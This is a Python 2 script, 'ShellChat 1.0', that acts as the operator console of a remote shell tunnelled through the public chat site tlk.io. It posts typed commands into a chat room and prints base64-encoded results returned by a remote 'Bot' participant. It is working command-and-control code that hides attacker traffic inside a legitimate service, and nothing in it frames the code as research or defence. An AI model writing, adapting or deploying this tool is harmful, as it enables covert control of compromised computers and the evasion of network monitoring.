import requests
import re
import time
import base64


class ShellChatServer(object):
    def __init__(self, chat_room, chat_nickname, chat_bot):
        self.chat_room = chat_room
        self.chat_nickname = chat_nickname
        self.chat_bot = chat_bot
        self.chat_api_messages = ""
        self.session = requests.Session()
        self.messages_black_list = []
        self.login()

    def login(self):  # Login and add previous messages to the blacklist
        chat_html = self.session.get('https://tlk.io/' + self.chat_room).text
        chat_id = re.search('ownership: \'/api/chats/(.*)/ownership\'', chat_html).group(1)
        self.chat_api_messages = 'https://tlk.io/api/chats/' + str(chat_id) + '/messages'
        chat_csrf_token = re.search('<meta content="(.*)" name="csrf-token" />', chat_html).group(1)
        self.session.headers.update({'Host': 'tlk.io',
                   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
                   'Accept': 'application/json, text/javascript, */*; q=0.01',
                   'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
                   'Accept-Encoding': 'gzip, deflate, br',
                   'X-CSRF-Token': str(chat_csrf_token),
                   'X-Requested-With': 'XMLHttpRequest',
                   'Referer': 'https://tlk.io/' + self.chat_room})
        self.session.post('https://tlk.io/api/participant', data={'nickname': self.chat_nickname})

        for m in self.session.request('GET', self.chat_api_messages).json():
            self.messages_black_list.append(m['id'])

        print 'ShellChat 1.0 -_-'
        print 'Connected to ' + 'https://tlk.io/' + self.chat_room
        self.send_cmd()

    def send_cmd(self):  # Wait & execute commands, then send output in chat
        result = ""
        cmd_result = True
        while True:
            if cmd_result:
                cmd = raw_input("shell>")
                self.session.post(self.chat_api_messages, data={"body": cmd, "expired": False})
                cmd_result = False
            else:
                for m in self.session.request('GET', self.chat_api_messages).json():
                    if m['nickname'] == self.chat_bot and m['id'] not in self.messages_black_list:
                        body = m['body']
                        if body.startswith('BEGIN//'):
                            body = body[7:]

                        if body.endswith('END//'):
                            body = body[:-5]

                        result += body
                        self.messages_black_list.append(m['id'])  # Add message to the blacklist

                        if (m['body'].startswith('BEGIN//') and m['body'].endswith('END//')) or (m['body'].startswith('BEGIN//') == False and m['body'].endswith('END//')):
                            cmd_result = True
                            print base64.b64decode(result)
                            result = ""
            time.sleep(3)


if __name__ == '__main__':
    ShellChatServer('DQpDb25maWd1cmF0aW9uIElQIGRl', 'Admin', 'Bot')
